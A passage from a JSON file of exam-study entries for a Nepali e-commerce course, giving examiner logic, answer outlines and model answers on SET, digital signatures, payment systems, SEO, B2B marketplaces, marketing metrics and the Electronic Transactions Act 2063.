post bids and asks that are matched. Use: commodity and B2B spot markets.\nAdd bidder verification, deposit and escrow so the winner actually pays."},"ecom-3":{"u":5,"logic":"Pairs a technical control with a human control. The examiner is checking whether you know a digital signature is not encryption, and whether you can treat people as the weakest link with real countermeasures.","how":"Draw the sign-verify flow (hash, private key, public key), then answer social engineering with a why-then-fix structure. Three fixes minimum, one Nepal example.","skel":["Signature = hash + private key","Verify with public key certificate","Gives integrity, authenticity, non-repudiation","Social engineering exploits trust, not code","Fix: training, MFA, verification, least privilege"],"ans":"A digital signature is the hash of a message encrypted with the sender's private key. The receiver re-hashes the message and decrypts the signature with the sender's public-key certificate; a match proves the message is unaltered and came from the key holder.\nUses in e-commerce: authenticating buyers and merchants, protecting order and payment messages, giving non-repudiation, securing SET's dual signature, and satisfying the Electronic Transactions Act 2063, which gives digital signatures legal validity.\nSocial engineering is highly effective against e-commerce because staff handle many low-value contacts, trust a familiar brand voice, and hold refund, KYC and admin powers worth money. Attacks: phishing, pretexting as eSewa support, fake courier calls, baiting, tailgating.\nCountermeasures:\n• Awareness training with simulated phishing and a no-blame reporting rule.\n• MFA and phishing-resistant logins for admin and finance; OTP never shared.\n• Callback verification before changing bank details or approving refunds.\n• Least privilege, segregation of duties, audit logs, DMARC and SPF.\n• Publish the real support channel and monitor for fake pages."},"ecom-4":{"u":1,"logic":"An Act-specific recall question. It tests whether you know the tribunal exists, who sits on it and why it matters, not general cyber-law opinion. Marks are for structure, not length.","how":"Answer in four blocks: purpose, composition, jurisdiction, appeal. Four headings, two lines each — five marks is five lines, not an essay.","skel":["Purpose: speedy trial of computer offences","Composition: chairperson plus two members","Jurisdiction: offences under the Act","Procedure: summary and technical evidence","Appeal lies to the Supreme Court"],"ans":"The Electronic Transactions Act 2063 sets up an Information Technology Tribunal to try computer-related offences under the Act, so cases needing technical evidence go to a specialised body.\n• Composition — a chairperson and two members appointed by the Government of Nepal; the chairperson is qualified to be a High Court judge and one member has an IT or law background.\n• Jurisdiction — offences defined in the Act: unauthorised access, damage to source code, computer fraud, piracy, publishing illegal content, and abetment.\n• Procedure — summary hearing, electronic evidence allowed, and the decision is treated as a court order.\n• Appeal — to the Supreme Court within the prescribed period.\nSignificance: logs and digital evidence need a forum that understands them, and a fast remedy keeps buyer trust."},"ecom-5":{"u":2,"logic":"Tests whether you can distinguish the two forms of private industrial network by ownership and membership, rather than lumping them with exchanges. Examples are the differentiator.","how":"Two headings — single-firm and industry-wide — with owner, members, example and one benefit each. A simple two-column sketch is free marks.","skel":["PIN = private network, one sponsor","Single-firm: one buyer, many suppliers","Example: Walmart Retail Link","Industry-wide: shared by several firms","Example: automotive and chemical networks"],"ans":"A private industrial network is a closed, invitation-only internet network linking one or more large firms with their suppliers and distributors; the sponsoring firms own it, unlike an open exchange.\n• Single-firm — one large buyer builds the platform and requires its suppliers to use it. The sponsor sees demand and stock data and drives just-in-time replenishment. Example: Walmart's Retail Link; in Nepal, a large retailer giving distributors a stock and purchase-order portal.\n• Industry-wide — several firms in one industry jointly sponsor a shared network so the whole chain, including smaller suppliers, exchanges orders, forecasts and design data. Examples: Covisint (automobiles), Exostar (aerospace), Elemica (chemicals).\nBenefit: lower inventory, faster cycles, tighter coordination. Limit: high cost and supplier resistance, since the sponsor holds the power."},"ecom-6":{"u":3,"logic":"A named-protocol question. The examiner wants the six participants and the message names, not a vague claim that SET is secure. Missing message flow is where most students lose marks.","how":"Draw six boxes with arrows, then list the six message pairs in order. Write the message names in capitals so the examiner sees them instantly.","skel":["SET = Visa and MasterCard card-payment standard","Six participants from cardholder to CA","Registration: CReq, CRes","Purchase: PInitReq, PReq, PRes","Authorisation and capture: AuthReq, CapReq"],"ans":"SET (Secure Electronic Transaction) is an open standard by Visa and MasterCard for secure card payment over open networks, using X.509 certificates and dual signatures; the merchant never sees the card number.\nParticipants:\n• Cardholder — the buyer with a SET wallet and certificate.\n• Merchant — the seller with a SET merchant certificate.\n• Issuer — the cardholder's bank.\n• Acquirer — the merchant's bank, which settles funds.\n• Payment gateway — the interface to the banking network; it sees payment data only.\n• Certificate authority — issues and revokes certificates binding keys to identities.\nMessage flow: cardholder and merchant registration (CReq/CRes) with the CA; purchase request (PInitReq/PInitRes, then PReq with the dual signature, answered by PRes); payment authorisation (AuthReq/AuthRes through gateway, acquirer and issuer); payment capture (CapReq/CapRes); then clearing and settlement. Registration must complete before any purchase message is accepted."},"ecom-7":{"u":4,"logic":"Checks that you see a website as a project with phases, not a single design task. It rewards anyone who mentions payment testing, security and maintenance, which students usually forget.","how":"Write six phases in order with one deliverable each, then add a line on platform choice. The phase list alone carries most of the marks.","skel":["Plan: goals, audience, business case","Design: catalogue, navigation, checkout flow","Build: storefront, cart, payment integration","Test: load, security, payment sandbox","Launch, market, then maintain and iterate"],"ans":"1. Plan — value proposition, target segment, product range, revenue model, budget and legal duties.\n2. Analyse — customer, competitor and order-to-delivery requirements; functional and non-functional needs.\n3. Design — category tree, page wireframes, checkout funnel, mobile-first layout, database schema.\n4. Build — platform choice (WooCommerce, Magento, Shopify or custom), catalogue, cart, payment gateway (eSewa, Khalti, connectIPS, cards, COD), courier and ERP links.\n5. Test — functional, load, security and payment-sandbox tests; check tax, shipping and refund rules.\n6. Deploy and maintain — hosting, SSL, SEO, analytics; then patching, A/B tests and catalogue updates.\nDraw it as a cycle: maintenance feeds the next planning round."},"ecom-8":{"u":5,"logic":"Three short parts that test security vocabulary and their link. It probes whether you know that non-repudiation needs proof of origin, not just secrecy, and whether you can list threats without repeats.","how":"Define, then name the mechanism with its three ingredients (signature, certificate, timestamp), then a seven-item threat list. Keep each threat to four words.","skel":["Non-repudiation = cannot deny the act","Mechanism: digital signature plus PKI","Add timestamp, receipt, audit log","Threats: malware, phishing, hacking","Also fraud, sniffing, insider, spoofing"],"ans":"Non-repudiation means a party cannot deny having sent, received or authorised a transaction — a buyer cannot deny an order, a merchant cannot deny a promise.\nMechanism: a digital signature with PKI. The sender hashes the message and signs with a private key; the receiver verifies with the sender's certified public key. Add a trusted timestamp, a signed acknowledgement and tamper-evident audit logs; the Electronic Transactions Act 2063 makes such records admissible.\nThreats: malicious code (virus, worm, trojan, ransomware, botnet); adware and spyware; phishing and social engineering; hacking (DoS, SQL injection, XSS, session hijacking, carding); card fraud and identity theft; sniffing and man-in-the-middle; spoofing, pharming, insider misuse, click and chargeback fraud."},"ecom-9":{"u":6,"logic":"A numeric metric question. It checks that you can compute CPM and, more importantly, that you know eCPM lets you compare CPC, CPA and CPM deals on one scale before shifting budget.","how":"Write both formulas, then one worked example with real numbers. The eCPM comparison of two campaigns is the mark-winning line.","skel":["CPM = cost per thousand impressions","Formula: cost ÷ impressions × 1000","eCPM = revenue per thousand impressions","eCPM = CPA × conversion rate × 1000","Compare campaigns, then move budget"],"ans":"CPM is the price of one thousand ad impressions: CPM = (cost ÷ impressions) × 1000. A site charging Rs 2,000 for 100,000 views has CPM = Rs 20.\neCPM is revenue per thousand impressions under any pricing model, so CPM, CPC and CPA deals compare on one scale: eCPM = (revenue ÷ impressions) × 1000; for CPC, eCPM = CPC × CTR × 1000; for CPA, eCPM = commission × conversion rate × 1000.\nExample: Campaign A costs Rs 5 per click at 1% CTR, so eCPM = 5 × 0.01 × 1,000 = Rs 50; Campaign B costs Rs 40 CPM. A earns more per thousand views, so budget moves to A.\nSignificance: eCPM is the ROI yardstick — it shows which placement, creative or network earns most per impression, so spend follows measured return, not the lowest headline price."},"ecom-10":{"u":6,"logic":"Tests three display metrics that are often confused: reach is people, hits are requests, loyalty is repeat behaviour. The examiner wants clean definitions and how each guides a media buy.","how":"Define each in one line with its unit, then one line on the decision it supports. Keep hits separate from visitors — that distinction is the trap.","skel":["Reach = unique people exposed","Use reach with frequency and CPM","Hits = file requests, not visitors","Loyalty = repeat visits and purchases","Use loyalty to value lifetime spend"],"ans":"• Reach — unique people exposed to an ad or site in a period, counted once. 500,000 impressions at frequency 4 reach about 125,000 people. Use: price the buy, avoid paying repeatedly for one person, compare with segment size.\n• Loyalty — repeat behaviour: returning visitors, repeat purchases, purchase frequency. Use: compare loyal-customer lifetime value with acquisition cost, and shift budget to retention when loyalty is high.\n• Hits — every request for a file; one page with ten images is eleven hits. It measures server load and crude popularity, not audience, and inflates easily. Use for capacity planning only; report unique visitors and page views.\nReach says how many, loyalty says how often they return, hits say how busy the server is."},"ecom-11":{"u":7,"logic":"Tests whether you know PageRank is a link-based authority score, not a keyword score, and whether you can turn it into actions a small Nepali shop can actually take.","how":"Give the formula with damping 0.85, then two columns: on-page hygiene and link earning. Mention that links must be editorial, not bought.","skel":["PageRank = link-based importance score","Formula with damping factor 0.85","Quality inbound links raise it","Earn links: content, PR, directories","Avoid link farms and paid schemes"],"ans":"PageRank is Google's link-analysis measure of a page's importance: a page is important if important pages link to it, each link passing value divided by the linking page's outbound count. PR(A) = (1 − d) + d × Σ PR(Ti)/C(Ti), with d ≈ 0.85, computed iteratively.\nSignificance: it supplies the authority half of ranking, so higher PageRank helps every page rank, gets the site crawled more often, and builds domain trust — free, compounding traffic.\nTo raise it:\n• Publish link-worthy content: buying guides, price studies, size charts, delivery data.\n• Earn editorial links from relevant Nepali news sites, industry blogs, chambers and directories; give expert quotes and guest posts.\n• Reclaim unlinked brand mentions and fix broken links.\n• Use descriptive internal links and a clean category hierarchy.\n• Disavow spam links; never buy links or run link farms — that invites a penalty."},"ecom-12":{"u":7,"logic":"Disguises a recommendation-system question as an SEO brief. It checks that you can separate behaviour-based from attribute-based filtering and say when each fails.","how":"Two labelled halves, each with data used, output and failure mode, then a hybrid line. Say cold start once — it is the mark they look for.","skel":["Content-based uses item attributes and history","Output: similar products, long-tail pages","Collaborative uses other users' behaviour","Item-based: customers also bought","Hybrid covers cold start and sparsity"],"ans":"Content-based filtering builds a profile from one user's views and purchases, describes each product by attributes (category, brand, price, colour, keywords via TF-IDF or embeddings) and recommends similar items. It needs product metadata, works for new products and niche catalogues, and lets me auto-generate \"similar products\" blocks and long-tail category pages that rank. Weakness: no surprises, and it depends on good data.\nCollaborative filtering uses the user-item matrix. User-based finds shoppers with similar histories; item-based finds products bought together, powering \"customers also bought\". It needs no attributes and surfaces cross-category finds, but suffers cold start and sparsity.\nPlan: content-based for first visits and new SKUs, collaborative once behaviour accrues, hybrid scoring on home, product and cart pages. Measure click-through and conversion."},"ecom-13":{"u":3,"logic":"The classic SET 10-marker. It tests the actual construction of the dual signature and whether you understand why it exists: merchant sees order data, bank sees payment data, neither sees both.","how":"Write the construction as a numbered 5-step flow and draw OI and PI going two ways. The 'why' line — privacy plus linkage — is worth 3 marks.","skel":["Problem: buyer wants privacy from each party","Hash OI and PI separately","Hash the two hashes together, sign it","Merchant verifies half, gateway the other","Both halves provably belong to one order"],"ans":"A dual signature lets a cardholder sign order information (OI) and payment information (PI) so that the merchant sees only OI and the bank only PI, yet both can prove they belong to the same purchase.\n1. Compute H(OI) and H(PI).\n2. Concatenate and hash again: H(H(OI) || H(PI)).\n3. Encrypt with the cardholder's private key — the dual signature DS.\n4. Send the merchant OI, H(PI), DS; send the gateway PI, H(OI), DS.\n5. Merchant hashes OI, joins it with H(PI), decrypts DS with the public key and compares; the gateway does the mirror check.\nEach party verifies using its own half plus the digest of the half it never sees, so neither reads the other's data, but a mismatch proves tampering. This gives confidentiality, integrity and non-repudiation.\nIn the SET purchase request, PReq carries OI and DS to the merchant, which verifies and forwards PI, H(OI) and DS to the gateway in AuthReq. The issuer then authorises exactly the amount signed for the order the merchant will fulfil."},"ecom-14":{"u":6,"logic":"Tests whether you can define digital marketing and then use three funnel metrics diagnostically. Students define the metrics but cannot say what to change when each is bad.","how":"Define, give three reasons it is essential, then treat each metric as a diagnosis: what it measures, what a bad number means, what to fix.","skel":["Digital marketing = promotion via digital channels","Essential: reach, cost, targeting, measurement","CTR: subject line and offer relevance","Bounce rate: list quality and deliverability","Conversion rate: landing page and trust"],"ans":"Digital marketing is promotion through digital channels — search, display, social, e-mail, mobile, affiliate and content — with measurable response at every step.\nIt is essential because a storefront has no physical presence: digital channels create discovery, cost per acquisition is trackable, targeting is precise, content builds trust before purchase, and campaigns can be tested within days. For a Nepali seller, Facebook, Instagram and an e-mail list reach buyers far cheaper than print.\n• CTR = clicks ÷ delivered × 100. It measures subject line, offer and creative relevance; a low CTR means rewrite the subject, segment the list or sharpen the call to action.\n• Bounce-back rate = bounced ÷ sent × 100. Hard bounces mean stale addresses, so prune the list; a spike signals deliverability or spam-filter trouble, which also harms sender reputation.\n• Conversion rate = orders ÷ clicks × 100. It measures landing page, price and checkout trust; good CTR with low conversion means fix the page, not the e-mail.\nTogether they locate the leak: CTR is a message problem, bounce a list problem, conversion a page problem. A/B test one variable at a time."},"ecom-15":{"u":2,"logic":"A core Unit 2 question. The examiner wants the four net-marketplace types plus private networks, each with an example, and the recognition that B2B differs from B2C in scale and negotiation.","how":"Define B2B in three contrasts with B2C, then five models as a labelled list with one example each. A small 2×2 sketch of marketplace vs private network helps.","skel":["B2B = business-to-business transactions","Few buyers, large orders, negotiated prices","Net marketplaces: e-distributor, e-procurement","Exchanges and industry consortia","Private industrial networks: one sponsor"],"ans":"B2B e-commerce covers transactions between organisations — a manufacturer buying parts, a retailer buying stock. Compared with B2C it has fewer but larger buyers, higher order values, negotiated prices, longer approval cycles, and EDI or API integration instead of a consumer checkout.\n• E-distributor — one firm sells its own catalogue to many business buyers at posted prices, e.g. Grainger; in Nepal, a hardware wholesaler with a dealer portal.\n• E-procurement — sells procurement software and services that automate requisition to payment, e.g. Ariba; value comes from spend control and less maverick buying.\n• Exchange — many buyers and sellers trade commodities at spot prices, e.g. Go2Paper.\n• Industry consortium — an exchange owned by large firms in one industry, restricted membership and negotiated contracts, e.g. Covisint, Exostar.\n• Private industrial network — a closed network sponsored by one large buyer linking suppliers for forecasting and replenishment, e.g. Walmart Retail Link.\nRevenue: sales margin, transaction fees, subscription, member fees, shared savings."},"ecom-16":{"u":2,"logic":"A definition-plus-justification short answer. It checks that you can separate omni-channel from multi-channel, which is the usual confusion, and support it with a concrete journey.","how":"One-line definition, one line on the multi-channel difference, then a four-step customer journey as the justification. The journey is the marks.","skel":["Omni-channel = one seamless experience everywhere","Shared inventory, pricing, profile, orders","Multi-channel = separate silos","Example: app, store, wallet, return","Justify: conversion, trust, lower returns"],"ans":"Omni-channel means one brand and one continuous journey across every touchpoint — store, website, app, social page, marketplace, call centre and delivery — with shared inventory, pricing, promotions, order history and loyalty points behind them. Multi-channel differs: each channel runs separately, so a customer repeats information and cannot return an online order in a store.\nExample: a Kathmandu customer sees a jacket on the Bhatbhateni app, checks that the nearby store has her size, pays with eSewa, chooses store pickup, collects it the same day, and later returns it at the counter with the app receipt. Points and history sit in one profile.\nJustification: the customer never restarts, so conversion rises; stock is visible, so failed deliveries fall; staff see full history, so service is faster; and every channel improves targeting."},"ecom-17":{"u":2,"logic":"A comparison question on two easily confused net marketplaces. The examiner looks for ownership, membership and pricing differences, since those explain the different revenue models.","how":"Draw a four-row comparison: owner, members, pricing, example. Four rows, two columns, then one closing line on when each fits.","skel":["Exchange: independent, open to many firms","Exchange: spot pricing, transaction fee","Consortium: owned by industry leaders","Consortium: restricted, negotiated contracts","Example: Go2Paper versus Covisint"],"ans":"Both are B2B net marketplaces but differ in ownership and pricing.\n• Ownership — an exchange is run by an independent operator as a commercial venture; a consortium is owned by large firms in one industry, who fund and govern it.\n• Membership — an exchange is open to any qualified buyer or seller; a consortium restricts membership to owners and approved partners.\n• Pricing — exchanges are spot markets, prices moving with live supply and demand; consortiums use negotiated long-term contracts and collaborative forecasting.\n• Focus — exchanges maximise liquidity and price discovery; consortiums pursue supply-chain efficiency and shared standards.\n• Revenue — exchanges earn transaction fees; consortiums earn member fees and shared savings.\nExamples: Go2Paper versus Covisint (automotive) and Exostar (aerospace). Use an exchange for many counterparties at market prices; a consortium when a few large firms must coordinate a complex chain."},"ecom-18":{"u":3,"logic":"Tests the payment vocabulary and whether you can walk a card transaction through authorisation and settlement. Students usually stop at the gateway and lose the settlement marks.","how":"Define e-payment in one line, then draw the six-party chain left to right and label authorisation, capture and settlement. Name the message at each arrow.","skel":["E-payment = electronic transfer of value","Cardholder, merchant, gateway, acquirer","Card association routes to issuing bank","Issuer approves or declines","Capture, clearing, settlement, statement"],"ans":"An e-payment system transfers monetary value electronically over a network — cards, wallets, bank transfers, digital cash, e-cheques.\nOnline credit card transaction:\n1. The cardholder pays on an HTTPS checkout, entering card number, expiry and CVV; the merchant stores only a token.\n2. The gateway may run 3-D Secure and send an OTP to the cardholder's phone.\n3. The request goes to the acquiring bank, then through the card association (Visa, Mastercard) to the issuing bank.\n4. The issuer checks balance, limit and fraud rules, and returns approve or decline with an authorisation code.\n5. The code travels back to the merchant, which confirms or cancels the order.\n6. At capture the merchant submits approved transactions; clearing nets them and settlement credits the merchant account at T+1/T+2, minus the merchant discount rate.\n7. The issuer bills the cardholder on the statement.\nSecurity: TLS, PCI-DSS, CVV, address verification, tokenisation, chargeback rules."},"ecom-19":{"u":4,"logic":"A checklist question that separates students who have thought about a real launch from those who list only design. Payment integration, security and legal elements carry the marks.","how":"Group into five buckets — business, content, technology, money, trust — and give two items each. Buckets stop you rambling and look organised.","skel":["Business: value proposition, audience, pricing","Content: catalogue, images, categories, search","Technology: cart, checkout, hosting, mobile","Money: gateway, COD, tax, shipping rules","Trust: SSL, policies, returns, support"],"ans":"• Business foundation — value proposition, target segment, product range, pricing, revenue model, budget.\n• Catalogue and content — complete product data (title, attributes, variants, price, stock), good photographs, search-friendly descriptions, a logical category tree, internal search.\n• Usability — simple navigation, filters, a cart that survives login, guest checkout, a short checkout, mobile-first layout, since most Nepali traffic is mobile.\n• Payments — eSewa, Khalti, connectIPS, cards and cash on delivery; show delivery and tax before the final step.\n• Security and trust — SSL, PCI-DSS compliant gateway, privacy policy, terms of sale, return and refund policy, contact details, reviews.\n• Operations — order management, inventory sync, courier tracking, invoicing and VAT records.\n• Legal and growth — Electronic Transactions Act 2063 compliance, analytics, SEO, hosting that scales on festival traffic."},"ecom-20":{"u":5,"logic":"Tests the two primitives of e-commerce security and, crucially, whether you know a hash is not encryption and a signature is not a secret. The pairing question rewards a clean division of labour.","how":"Two headings: cryptography (symmetric, asymmetric, hybrid) and hash (properties, uses). Close with one line showing them combined in TLS and in a signature.","skel":["Symmetric: AES, fast, key distribution problem","Asymmetric: RSA, public and private keys","Hybrid: asymmetric exchanges symmetric key","Hash: one-way, fixed length, collision resistant","Hash plus private key makes a signature"],"ans":"Cryptography hides content; hash functions prove it is unchanged.\n• Symmetric — one shared key, e.g. AES-256: fast, used for bulk data, but key distribution is the problem.\n• Asymmetric — a public and private key pair, e.g. RSA or ECC: solves key exchange and enables signatures, but is slow.\n• Hybrid — asymmetric exchange of a session key, then symmetric encryption of the traffic; this is how TLS protects checkout.\nHash functions give a fixed-length one-way digest, e.g. SHA-256, resisting preimage and collision attacks and showing the avalanche effect.\nUses: verifying that a download or order message is unaltered; storing passwords with a salt using bcrypt or Argon2; message authentication codes; and digital signatures, which sign the hash rather than the whole message.\nCombined, TLS agrees a session key asymmetrically, encrypts symmetrically and adds an integrity tag; a signature hashes the order and encrypts the digest with a private key — giving confidentiality, integrity, authentication and non-repudiation."},"ecom-21":{"u":5,"logic":"Two unrelated short notes in one question, a common CSIT pattern. It tests whether you can switch topics cleanly and still name the SSL handshake steps instead of saying 'it encrypts'.","how":"Two clear headings, five lines each. For SSL write the handshake as four numbered steps and name HTTPS — the steps are the marks.","skel":["Adware: software that forces ads on users","Bundled with freeware, hijacks browser","Fix: anti-malware, official downloads","SSL: handshake verifies certificate","Session key encrypts, HTTPS protects data"],"ans":"Adware is software that automatically displays or redirects to advertisements, often bundled with free downloads or installed as a browser extension. It slows the machine, changes the home page and search engine, injects pop-ups, tracks browsing and sometimes pulls in more malware; the distributor earns pay-per-install or ad revenue. Defence: install from official sources, untick bundled offers, update the browser, run anti-malware, remove suspicious extensions.\nSSL/TLS secures the browser-server connection:\n1. Browser sends a hello with ciphers and a random value.\n2. Server returns its X.509 certificate, which the browser validates against a trusted CA chain, hostname and expiry.\n3. Keys are exchanged (ECDHE) and both sides derive a session key.\n4. The record layer encrypts traffic and adds a MAC against tampering.\nThis protects logins, card data and session cookies from sniffing and man-in-the-middle attacks, shows the padlock that builds trust, and is required by gateways and PCI-DSS. HTTPS is HTTP over this channel."},"ecom-22":{"u":6,"logic":"Tests three channels that are often blurred together. The examiner wants each tied to a distinct mechanism and objective, with an example, not three generic praises of social media.","how":"Three short blocks, each: what it is, one tactic, one Nepali example, one metric. Keep them equal length so nothing looks padded.","skel":["Social: platforms, influencers, UGC, shops","Mobile: SMS, push, app, QR, location","Local: geo-ads, maps, near-me search","Each needs a metric to judge spend","Nepal example for each channel"],"ans":"• Social marketing — platforms for community and sales: organic posts, paid ads, influencers, user content, social listening, in-app shops. Example: a Kathmandu clothing brand posts Reels, sends samples to local influencers and boosts the best post to women aged 20–35; it tracks reach, engagement and orders.\n• Mobile marketing — the device: SMS and Viber broadcasts, app push, in-app ads, mobile-optimised pages, QR codes, location offers. Example: Daraz pushes an 11.11 countdown to its app and Viber list; it tracks open rate, click-through and app orders. Most Nepali traffic is mobile, so pages must be fast and thumb-friendly.\n• Local marketing — geography: geo-fenced ads, Google Business Profile and Maps, \"near me\" search, delivery-radius targeting. Example: a Lalitpur restaurant runs a 5 km lunchtime ad with a map listing and order button; it tracks calls, direction requests and redemptions.\nTogether they form a funnel: social creates discovery, mobile keeps presence, local converts nearby intent."},"ecom-23":{"u":7,"logic":"Tests the crawl-index-rank-serve pipeline. Students describe PageRank only; the marks are for the three stages and the inverted index, plus what robots.txt and sitemaps do.","how":"Draw four boxes with arrows: crawl, index, rank, serve. One line each, then a note on robots.txt and sitemap.xml under crawling.","skel":["Crawl: spiders follow links and sitemaps","Respect robots.txt, canonical tags","Index: parse, store in inverted index","Rank: relevance, authority, user signals","Serve: results page with snippets and ads"],"ans":"1. Crawling — spiders fetch pages by following links and sitemap.xml; robots.txt blocks paths, and canonical tags, redirects and noindex control duplicates.\n2. Indexing — the page is parsed; text, headings, links and structured data are extracted, stop words removed, and terms stored in an inverted index mapping each word to the documents and positions where it appears.\n3. Ranking — for a query the engine retrieves candidates and scores relevance (term match, synonyms, intent, freshness, local signals), authority (link-based PageRank, brand mentions) and user experience (mobile-friendliness, speed, click behaviour).\n4. Serving — the results page renders titles, snippets, images and features such as maps, shopping boxes and ads, personalised by location, language and history.\nFor a shop: keep the catalogue crawlable, submit a sitemap, avoid duplicate filter URLs, write unique titles and descriptions, and earn links so product pages rank."},"ecom-24":{"u":1,"logic":"A recall question on the legal basis of Nepali e-commerce. It tests whether you know the Act's purpose and main chapters of content, not section numbers or dates you may misremember.","how":"Answer in five blocks: purpose, e-records, signatures and CAs, offences, tribunal and evidence. One line each is enough for five marks.","skel":["Enacted 2063 BS to legalise e-transactions","E-records equal to paper records","Digital signatures and licensed certifying authorities","Computer offences and penalties defined","IT Tribunal and electronic evidence"],"ans":"The Electronic Transactions Act, 2063 (2006) is Nepal's legal foundation for e-commerce and e-governance: it gives electronic records and signatures the standing of paper, regulates certifying authorities and punishes computer crime.\n• Legal recognition — electronic records, contracts and signatures are valid and enforceable if they meet the reliability test, and are admissible as evidence.\n• Authentication — digital signatures are verified through certificates from licensed certifying authorities; subscribers must protect private keys.\n• Offences — unauthorised access, damage to source code, computer fraud, piracy, publishing illegal content and privacy violation, each with fines and imprisonment.\n• Institutions — an Information Technology Tribunal to try these offences, with investigation and electronic-evidence provisions.\nSignificance: a Nepali business can contract, invoice and pay online with legal backing; the Act underpins wallet and gateway licensing and gives buyers a remedy against fraud."},"ecom-25":{"u":2,"logic":"Tests whether you understand advantage as something that must be defensible, and whether you can explain four named dimensions instead of listing generic strengths. Perfect market is the one students misuse.","how":"Define advantage in one line, then four blocks with mechanism and example. Start each block with the definition, not an example.","skel":["Advantage = defensible edge over rivals","Asymmetry: unequal information or access","Complementary resources: hard-to-copy bundle","Perfect market: cut search friction","Leverage: reuse assets in new markets"],"ans":"Competitive advantage is a firm's ability to outperform rivals through better value or lower cost, in a way that is hard to copy; it must show as margin, growth or retention, and it must last.\n• Asymmetry — one firm knows, owns or can do something others cannot: superior customer data, an exclusive supplier, a patent, first-mover position. Daraz's years of transaction data improve targeting in a way a new entrant cannot match; the advantage lasts only until the asymmetry closes.\n• Complementary resources — bundling assets rivals cannot assemble, so the whole is worth more than the parts. A marketplace plus its own logistics plus a wallet plus seller financing is far harder to copy than any single piece.\n• Perfect market — a market with full information and no friction. A firm gains by creating it: transparent pricing, low search cost, fast settlement. The innovator wins volume and trust, but once rivals copy, margins compress, the customer keeps the gain, and the advantage must be re-earned.\n• Leverage — reusing brand, data, distribution or infrastructure in a new market at low marginal cost. eSewa moving into utility bills, ticketing and QR merchant payments is leverage.\nSustain it by combining dimensions and protecting the underlying resources."},"ecom-26":{"u":3,"logic":"Joins a current payment instrument to SET's two back-end operations. It separates students who know the wallet is a stored-value account from those who call it an app, and tests SET message names.","how":"Define the wallet with its three types and Nepal examples, then draw the SET authorisation chain and name AuthReq/AuthRes, CapReq/CapRes.","skel":["Wallet: stored value in an app or account","Closed, semi-closed, open types","Load, pay, merchant claim, settle","SET authorisation: AuthReq to issuer","Capture: CapReq moves funds to merchant"],"ans":"A digital wallet is an app or account storing monetary value or card details, letting the holder pay and receive money electronically — a stored-value system loaded from a bank, card or another wallet.\n• Closed — one merchant, no cash-out (coffee shop card).\n• Semi-closed — many merchants, no withdrawal.\n• Open — withdrawal and transfer allowed: eSewa, Khalti, IME Pay, on Fonepay/connectIPS rails under NRB licence.\nWorking: register with KYC, load funds, pay by QR or mobile number, the merchant claims, the provider settles to the merchant's bank, both sides get a receipt.\nSET authorisation: after verifying the PReq, the merchant sends AuthReq with payment information, dual signature and transaction identifiers to the gateway. The gateway verifies the cardholder and merchant certificates and the dual signature, then routes through the acquirer and card association to the issuer, which approves or declines. AuthRes returns the approval code and the merchant completes the order.\nSET capture: the merchant later sends CapReq for the authorised amount, alone or batched. The gateway routes it through the acquirer to the issuer, funds move, and CapRes returns a capture token. The gateway stores the capture to match clearing and settlement, so the merchant is paid once only."},"ecom-27":{"u":6,"logic":"Asks for four funnel ratios by name and their effect on display advertising. The trap is defining them but never saying what a manager should change when a ratio is poor.","how":"Define display ads, then draw a funnel view-to-cart to retention, placing each ratio at its stage. One fix per ratio.","skel":["Display ads: banners, video, retargeting on sites","Priced CPM, CPC or CPA, often programmatic","Attrition: drop-off between funnel steps","View-to-cart: creative and page persuasion","Acquisition and retention: growth versus leak"],"ans":"Display ad marketing places visual ads — banners, rich media, video, native and retargeting — on publisher sites and apps, bought directly or programmatically by real-time bidding, priced by CPM, CPC or CPA. Value depends on what happens after the impression.\n• Attrition rate — the share lost between two steps, e.g. product view to checkout. High attrition means a leaking funnel: slow page, surprise shipping cost, forced registration. Fix the step, not the ad.\n• View-to-cart ratio — carts ÷ product views. It measures how persuasive the ad, price and landing page are; a low ratio means the creative promised what the page did not deliver, or the audience is wrong.\n• Acquisition rate — new customers ÷ unique users reached. It measures how efficiently spend turns strangers into buyers and sets cost per acquisition; low means narrow targeting or sharpen the offer.\n• Retention rate — repeat buyers ÷ customers. It shows whether acquired customers stay; low retention makes display a leaky bucket, so budget shifts to retargeting, e-mail and loyalty.\nRead as a funnel: an ad can win clicks and still lose money if view-to-cart, acquisition or retention is weak. Judge display on revenue per thousand impressions, not clicks alone."},"ecom-28":{"u":6,"logic":"A reasons question. It tests whether you can explain social commerce growth by structural drivers — smartphone, trust, frictionless checkout — rather than saying 'because social media is popular'.","how":"Give six drivers with a one-line mechanism each, then one Nepal example at the end. Group into technology, trust and economics.","skel":["Cheap smartphones and data","Discovery in feed replaces search","Peer trust: reviews, influencers, UGC","In-app checkout removes friction","Low setup cost for small sellers"],"ans":"• Cheap smartphones and data — a young population is online for hours, so the feed becomes the shop window.\n• Discovery shift — impulse buyers find products while scrolling instead of searching a marketplace.\n• Trust through people — reviews, ratings, influencer recommendations and user content reduce the risk of buying from an unknown seller.\n• Frictionless checkout — in-app shops, saved cards, chat ordering and one-tap wallets shorten post-to-payment.\n• Live and social proof — live sales, countdowns and visible comments create urgency and answer questions instantly.\n• Low entry cost — a small Nepali seller starts with a Facebook page, a phone camera and a wallet, with no website or shop rent.\n• Platform tools — precise targeting, lookalike audiences and the Pixel make paid reach cheap and measurable.\n• Payments and delivery — eSewa, Khalti, Fonepay QR and courier networks such as Pathao complete the loop.\nDiscovery, trust, payment and delivery now sit in one place."},"ecom-29":{"u":2,"logic":"Tests a foundational B2B technology and whether you can show its value with a real document flow. Students define EDI but cannot name a standard or an actual message.","how":"Define in one line, draw the translator-VAN-translator chain, then a four-line example with ORDERS and INVOIC. The example carries the justification marks.","skel":["EDI: computer-to-computer standard documents","Standards: ANSI X12, EDIFACT","Translator, VAN or AS2, partner translator","Benefits: speed, accuracy, cost, JIT","Example: export order to invoice flow"],"ans":"EDI is the computer-to-computer exchange of standard business documents — purchase order, invoice, advance ship notice, payment advice — between trading partners in a fixed format, with no re-keying. Common standards are ANSI X12 and UN/EDIFACT.\nArchitecture: the business application passes data to an EDI translator, which maps it into the standard message; it travels over a value-added network or the internet (AS2, SFTP); the partner's translator maps it back.\nSignificance: orders move in minutes, transcription errors vanish, cost per document falls, stock is replenished just-in-time, and every exchange leaves an audit trail. It also lets a small Nepali supplier trade on a large buyer's system.\nExample: a Kathmandu garment exporter receives an EDIFACT ORDERS message from a European retailer; the translator validates it and creates a sales order, then DESADV and INVOIC go out automatically on dispatch. Nobody retypes the order, so quantity and price errors disappear."},"ecom-30":{"u":3,"logic":"Tests whether you can separate virtual currency from e-cash and from crypto, and whether you 